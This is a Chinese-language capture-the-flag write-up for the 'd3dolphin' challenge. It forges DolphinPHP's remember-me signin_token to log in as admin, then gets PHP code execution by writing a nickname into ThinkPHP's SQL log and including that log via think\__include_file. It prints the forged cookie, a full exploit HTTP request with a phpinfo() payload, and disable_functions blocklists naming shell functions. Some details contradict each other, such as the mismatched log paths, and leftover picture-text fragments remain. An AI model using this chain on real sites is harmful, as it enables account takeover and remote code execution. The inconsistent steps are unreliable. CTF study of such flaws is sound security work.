# d3dolphin

## 题目简述

题目基于 DolphinPHP/ThinkPHP 后台。第一步利用 remember-me cookie 的签名生成逻辑和已知 `last_login_time` 伪造管理员登录；第二步利用 DolphinPHP 历史 RCE 的修补方式只做函数黑名单这一弱点，绕过禁用函数后把可控 nickname 写入 SQL 日志，再借 ThinkPHP 的 `think\__include_file` 包含日志文件执行 PHP 代码。

## 解题过程

1. 只要知道 `username`、`id` 和 `user['last_login_time']`，就可以轻松构造 `signin_token`。

```
if (!function_exists('is_signin')) {
    /**
* 判断是否登录
* @author 蔡伟明 <314013107@qq.com>
     * @return mixed
     */
    function is_signin()
    {
        $user = session('user_auth');
        if (empty($user)) {
// 判断是否记住登录
            if (cookie('?uid') && cookie('?signin_token')) {
                $UserModel = new User();
                $user = $UserModel::get(cookie('uid'));
                if ($user) {
                    $signin_token =
data_auth_sign($user['username'].$user['id'].$user['last_login_time']);
                    if (cookie('signin_token') == $signin_token) {
// 自动登录
                        $UserModel->autoLogin($user);
                        return $user['id'];
                    }
                }
            };
            return 0;
        }else{
            return session('user_auth_sign') == data_auth_sign($user) ?
$user['uid'] : 0;
        }
    }
}
```

根据 `log.txt`，admin 的 `last_login_time` 是 `2011-04-05 14:19:19`。因此可以生成如下 `signin_token`：

```
   function data_auth_sign($data = [])
    {
// 数据类型检测
        if(!is_array($data)){
            $data = (array)$data;
        }
// 排序
        ksort($data);
// url编码并生成query字符串
        $code = http_build_query($data);
// 生成签名
        $sign = sha1($code);
    }
sha1("0=admin1" + "1301984359") = ab5f486a24426d9158c99507da45ae3bac476dd6
```

然后使用下面的 cookie 登录后台：

```
Cookie: dolphin_uid=1;
dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6
```

2. CVE-2021-46097 的关键信息是：DolphinPHP v1.5.0 后台存在可导致远程代码执行的调用链，官方修补方式主要依赖禁用危险函数黑名单，而不是消除“可控函数/可控文件进入执行路径”的根因。因此本题继续沿着“找到未被禁用的执行/包含原语”方向绕过。

```
return [
    // 拒绝ie访问
    'deny_ie'       => false,
    // 模块管理中，不读取模块信息的目录
    'except_module' => ['common', 'admin', 'index', 'extra', 'user', 'install'],
    // 禁用函数
    'disable_functions' => [
        'eval',
        'passthru',
        'exec',
        'system',
        'chroot',
        'chgrp',
        'popen',
        'ini_alter',
        'ini_restore',
        'dl',
        'openlog',
        'syslog',
        'readlink',
        'symlink',
        'popepassthru',
        'phpinfo'
    ]
];
```

CVE-2023-0935 是 CVE-2021-46097 的绕过方式，其核心是继续利用 `shell_exec`。

在本题中，`shell_exec` 已经被加入 `system.php` 的 `disable_functions`，`php.ini` 中也禁用了下面这些函数：

```
passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini
_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_waitp
id,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_w
exitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal_dispatch,pcntl_get_last_er
ror,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_
getpriority,pcntl_setpriority,imap_open,apache_setenv,putenv
```

我们的目标是在 CVE-2021-46097 的基础上再次绕过这些限制。

`profile()` 会读取当前用户资料，并在部分字段更新时触发管理员相关逻辑。

位置在 `/application/admin/controller/index.php`。

通过修改 nickname，可以完全控制 `$details`，这里对应 `get_nickname(UID)` 的返回值。`action_name` 为 `user_edit`。

后台个人设置页面里，管理员用户的昵称显示为“超级管理员”，这是后续越权状态的可见验证。

ThinkPHP 框架在 `Loader.php` 中定义了一个名为 `include_file` 的函数。

框架的 `__include_file($file)` 与 `__require_file($file)` 封装最终仍直接调用 `include` / `require`。

因此可以把 `think\__include_file` 作为第一个参数传给 `call_user_func`。

另外，ThinkPHP 会在 `./runtime` 下记录 SQL 日志，而我们刚才修改的是 admin 的 nickname。nickname 会先被拼进 SQL 语句，再写入日志。

SQL 日志显示可控字段进入 `UPDATE dp_admin_user SET ...`，其中 `nickname` 可被写成 `/runtime/log/202304/29.log` 这类路径。

最终 RCE 链如下：

修改 `user_edit` action 后可以控制头像/昵称等字段进入日志或文件包含路径。
---
---- Start of picture text -----**<br>
1. 修改 user_edit 动作。<br>**----- 图片文字结束 -----**<br>

后台页面中可见被写入的路径字段，说明日志路径污染成功。

2. 修改 admin 的 nickname，让日志文件中包含我们的 webshell。

- 3. 清空缓存。这一步是必要的，否则 nickname 不会更新。

清空缓存会触发模板/配置重新加载，从而让被污染的包含路径生效。

4. 将 nickname 修改为 `../runtime/2023/05/01.log`。随后发送如下请求即可执行 PHP 代码：

```
POST /admin.php/admin/index/profile.html HTTP/1.1
Host: localhost
Content-Length: 114
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/103.0.5060.53 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost
Referer: http://localhost/admin.php/admin/index/profile.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: dolphin_uid=1;
dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6;
PHPSESSID=88h9tlthje0nfe2sod7c8v6e39
Connection: close
__token__=d8c89447445b0095fb569725f91f0505&nickname=../runtime/log/202304/29.log
&email=&password=&mobile=&avatar=0&x=phpinfo();
```

5. 读取 flag。

## 方法总结

- 核心技巧：弱 remember-me 签名伪造、DolphinPHP/ThinkPHP 后台调用链、函数黑名单绕过、SQL 日志写入 webshell、`think\__include_file` 本地文件包含执行。
- 识别信号：PHP CMS 后台出现“危险函数黑名单修补历史漏洞”时，不能只看 `exec/system/shell_exec` 是否可用，应继续找文件包含、日志污染、模板编译、缓存写入等间接执行路径。
- 复用要点：外部 CVE 链接提供的核心不是某个固定 payload，而是“补丁只加黑名单”的漏洞形态；本题利用 nickname 进入 SQL log，再用 ThinkPHP loader 包含该 log。
